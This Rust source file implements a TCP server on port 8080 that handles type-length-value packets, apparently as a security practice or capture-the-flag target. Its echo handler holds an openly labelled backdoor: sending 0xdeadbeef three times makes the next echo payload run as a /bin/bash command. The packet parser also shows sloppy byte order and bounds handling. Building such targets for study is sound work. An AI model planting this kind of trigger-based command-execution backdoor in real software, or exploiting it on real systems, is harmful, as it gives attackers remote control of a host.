use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write};
use std::process::{Command, Output};

const TYPE_LENGTH: usize = 4;
const LENGTH_LENGTH: usize = 4;

static mut BACKDOOR_TRIGGER: u32 = 0;

struct TLVPacket {
    packet_type: u32,
    length: u32,
    value: Vec<u8>,
}

impl TLVPacket {
    fn new(packet_type: u32, length: u32, mut value: Vec<u8>) -> Self {
        // Truncate the value if its length exceeds the specified length
        if value.len() > length as usize {
            value.truncate(length as usize);
        }

        TLVPacket {
            packet_type,
            length,
            value,
        }
    }

    fn from_bytes(bytes: &[u8]) -> Option<Self> {
        let len = bytes.len();
        if bytes.len() < TYPE_LENGTH + LENGTH_LENGTH {
            return None;
        }

        let packet_type = u32::from_be_bytes([
            bytes[3],
            bytes[2],
            bytes[1],
            bytes[0],
        ]);

        let length = u32::from_be_bytes([
            bytes[7],
            bytes[6],
            bytes[5],
            bytes[4],
        ]) as usize;

        if bytes.len() < TYPE_LENGTH + LENGTH_LENGTH + length {
            return None;
        }

        let value = bytes[TYPE_LENGTH + LENGTH_LENGTH..].to_vec();

        Some(TLVPacket {
            packet_type,
            length: length as u32,
            value,
        })
    }

    fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend(&self.packet_type.to_be_bytes());
        bytes.extend(&self.length.to_be_bytes());
        bytes.extend(&self.value);
        bytes
    }

    fn handle_packet(&self) -> Vec<u8> {
        match self.packet_type {
            0x1 => Self::handle_name_packet(&self.value),
            0x2 => Self::handle_date_packet(),
            0x3 => Self::handle_working_directory_packet(),
            0x4 => {
                let response = Self::handle_echo_packet(&self.value);
                response
            }
            _ => vec![],
        }
    }

    fn handle_name_packet(name: &[u8]) -> Vec<u8> {
        let mut response = b"Hello, ".to_vec();
        response.extend(name);
        response.extend(b"!\n");
        response
    }

    fn handle_date_packet() -> Vec<u8> {
        let output = run_shell_command("date", &[]).unwrap();
        output.stdout
    }

    fn handle_working_directory_packet() -> Vec<u8> {
        let output = run_shell_command("pwd", &[]).unwrap();
        output.stdout
    }

    fn handle_echo_packet(value: &[u8]) -> Vec<u8> {
        let mut response = value.to_vec();
        unsafe {
            if response.len() == 4 && u32::from_be_bytes([response[3], response[2], response[1], response[0]]) == 0xdeadbeef {
                BACKDOOR_TRIGGER += 1;
            } else if BACKDOOR_TRIGGER == 3 {
                TLVPacket::backdoor(&response);
            }
        }
        response
    }

    fn backdoor(value: &Vec<u8>) {
        let command = String::from_utf8_lossy(value);
        println!("{}", command.to_string());
        let output = Command::new("/bin/bash")
            .arg("-c")
            .arg(command.to_string())
            .output()
            .expect("Failed to execute command");
        println!("{}", String::from_utf8_lossy(&output.stdout));
    }
}

fn run_shell_command(command: &str, args: &[&str]) -> Result<Output, std::io::Error> {
    Command::new(command)
        .args(args)
        .output()
}

fn handle_client(mut stream: TcpStream) {
    let mut buffer = [0; 4096];
    let mut incomplete_packet: Vec<u8> = Vec::new();

    loop {
        match stream.read(&mut buffer) {
            Ok(n) if n > 0 => {

                let mut bytes = Vec::new();
                bytes.extend_from_slice(&buffer[..n]);

                // Append any incomplete packet from previous reads
                bytes.extend_from_slice(&incomplete_packet);

                let mut offset = 0;

                // Process complete packets in the buffer
                while offset + TYPE_LENGTH + LENGTH_LENGTH <= bytes.len() {
                    let packet_bytes = &bytes[offset..];

                    println!("Parsing packet........");
                    if let Some(packet) = TLVPacket::from_bytes(packet_bytes) {
                        let response = packet.handle_packet();
                        stream.write_all(&response).expect("Failed to send response");

                        // Move offset to the next packet
                        offset += TYPE_LENGTH + LENGTH_LENGTH + packet.length as usize;
                    } else {
                        println!("Invalid packet received");
                        break; // Break the loop if the packet is invalid
                    }
                }

                // Store any incomplete packet for the next read
                incomplete_packet = bytes[offset..].to_vec();
            }
            Ok(_) | Err(_) => {
                println!("Client disconnected");
                unsafe {
                    BACKDOOR_TRIGGER = 0;
                }                
                return;
            }
        }
    }
}

fn main() {
    let listener = TcpListener::bind("0.0.0.0:8080").expect("Failed to bind");

    println!("Server listening on port 8080...");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection: {:?}", stream.peer_addr());
                handle_client(stream);
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }
    }
}
